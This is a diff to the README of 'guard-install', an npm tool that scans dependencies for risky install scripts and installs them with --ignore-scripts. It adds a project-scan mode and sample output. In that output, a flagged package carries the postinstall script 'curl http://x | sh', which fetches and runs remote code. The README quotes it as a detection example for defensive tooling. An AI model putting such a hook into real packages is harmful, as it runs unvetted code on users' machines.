@@ -19,11 +19,28 @@
 npx guard-install axios
 ```
 
+Or scan your entire project:
+
+```bash
+cd your-project
+npx guard-install
+```
+
 Or install globally:
 
 ```bash
 npm install -g guard-install
 guard-install axios
+```
+
+👉 **Pro tip:** Run `guard-install` with no arguments inside any project — it's a drop-in replacement for `npm install`, but safer:
+
+```bash
+# Before (dangerous — runs postinstall scripts blindly)
+npm install
+
+# After (scans for risk, installs with --ignore-scripts)
+guard-install
 ```
 
 ---
@@ -163,7 +180,10 @@ guard-install <package> [options]
 ### Examples
 
 ```bash
-# Standard analysis + prompt
+# Scan + safe install current project (the killer workflow)
+guard-install
+
+# Single package analysis + prompt
 guard-install axios
 
 # Skip prompt, install directly
@@ -179,7 +199,7 @@ guard-install axios --explain
 guard-install axios --strict
 guard-install axios --paranoid
 
-# Audit entire project
+# Audit entire project (summary only)
 guard-install --audit
 
 # Scan a git repo for malicious patterns
@@ -302,6 +322,39 @@ Verdict: 🔴 Risky
 
 🚫 Blocked — HIGH risk package not allowed in strict mode
 ```
+
+### Project scan (no args)
+
+```bash
+$ cd my-project
+$ guard-install
+
+📦 Found 42 dependencies
+
+✔ 42 packages scanned
+
+🟢 39 low risk
+🟡 2 medium risk
+🔴 1 high risk
+
+High risk:
+  • some-package
+    → Install scripts detected: postinstall: "curl http://x | sh"
+
+Medium risk:
+  • esbuild
+    → Install scripts detected: postinstall: "node install.js"
+
+? ⚠ High risk packages detected. Proceed with safe install (--ignore-scripts)? (y/N)
+```
+
+When you run `guard-install` with no arguments inside a project, it:
+1. Detects `package.json` automatically
+2. Scans all dependencies for risk
+3. Shows a clean summary
+4. Prompts to install safely with `--ignore-scripts`
+
+👉 This is **"npm install, but safer"**
 
 ### Project audit
 
